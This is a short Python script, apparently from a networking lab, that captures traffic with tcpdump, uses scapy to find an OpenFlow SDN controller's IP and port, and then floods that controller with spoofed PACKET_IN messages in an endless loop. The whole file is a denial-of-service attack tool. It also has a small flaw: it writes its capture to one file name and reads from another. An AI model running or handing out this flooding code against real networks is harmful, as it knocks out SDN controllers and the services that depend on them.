import time
from scapy.all import *
from scapy.contrib import openflow as of
import subprocess
import re


def get_controller():
	#Running tcpdump over the terminal
	output = subprocess.Popen(['sudo','tcpdump','-i','eth0','-w','lab71.pcap','-c','300'], stdout=subprocess.PIPE)
	time.sleep(10)

	#Code to detect controller IP and port
	load_contrib('openflow3')
	packet = rdpcap('lab7.pcap')
	print('Detecting the controller IP and port')
	for i in range(len(packet)):
		p1 = packet[i].show(dump=True)
		if re.findall('OFPT_FEATURES_REQUEST',p1):
			ctrl_port = packet[i]['TCP'].sport
			ctrl_ip = packet[i]['IP'].src
	print("Controller IP is: %s" %ctrl_ip)
	print("Controller port is: %s" %ctrl_port)
	return ctrl_ip, ctrl_port


def ddos_controller(ctrl_ip,ctrl_port):
	#Code to send packet_ins to controller
	seq = 0
	print("send packet_in messages to the controller")
	while True:
		pkt = of.Ether()/IP(dst=ctrl_ip, src='192.168.56.107')/of.TCP(sport=41510, dport=int(ctrl_port), seq=seq)/of.OFPTPacketIn()
		sendp(pkt, iface = 'eth0')
		seq += 1


if __name__ == '__main__':
	ctrl_ip, ctrl_port = get_controller()
	ddos_controller(ctrl_ip,ctrl_port)
